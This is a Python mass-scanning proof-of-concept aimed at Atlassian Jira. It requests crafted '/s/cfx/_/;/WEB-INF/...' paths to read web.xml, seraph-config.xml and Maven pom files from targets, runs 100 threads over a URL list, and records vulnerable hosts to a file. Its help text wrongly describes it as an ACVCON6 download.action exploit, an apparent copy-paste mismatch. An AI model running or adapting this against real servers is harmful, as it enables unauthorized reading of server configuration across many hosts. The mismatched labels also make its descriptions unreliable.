import argparse
import requests
import os
import sys
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def banner():
    test = '''

  ___  _   _               _                 ___ _                   __        
 / _ \| | | |             (_)               |_  (_)                 / _|       
/ /_\ \ |_| | __ _ ___ ___ _  __ _ _ __       | |_ _ __ __ _    ___| |___  __  
|  _  | __| |/ _` / __/ __| |/ _` | '_ \      | | | '__/ _` |  / __|  _\ \/ /  
| | | | |_| | (_| \__ \__ \ | (_| | | | | /\__/ / | | | (_| | | (__| |  >  <   
\_| |_/\__|_|\__,_|___/___/_|\__,_|_| |_| \____/|_|_|  \__,_|  \___|_| /_/\_\                                                                                                                                                              
                                               author:sanhua
                                               date:2024-09-13
                                               version:1.0
    '''
    print(test)

def poc(target):
    if not target.startswith('http://') and not target.startswith('https://'):
        target = 'http://' + target

    paths = [
        "/s/cfx/_/;/WEB-INF/web.xml",
        "/s/cfx/_/;/WEB-INF/decorators.xml",
        "/s/cfx/_/;/WEB-INF/classes/seraph-config.xml",
        "/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties",
        "/s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml",
        "/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
        "/s/cfx/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties"
    ]

    for path in paths:
        url = target + path
        try:
            response = requests.get(url, verify=False, timeout=10)
            if response.status_code == 200:
                print(f"[+] {target} 存在任何文件读取漏洞")
                with open("result.txt", "a", encoding='utf-8') as f:
                    f.write(f"{target} 存在任意文件读取漏洞\n")
            else:
                print(f"[-] {url} 不存在或状态码: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] {url} 请求失败，错误信息：{e}")

def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="ACVCON6 系统管理平台 download.action 任意文件下载漏洞")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        if not os.path.exists(args.file):
            print(f"[!] {args.file} 文件不存在，请检查路径")
            return
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                if url:  # 确保不添加空行
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t ACVCON6 系统管理平台 download.action 任意文件下载漏洞.py -h")

if __name__ == '__main__':
    main()
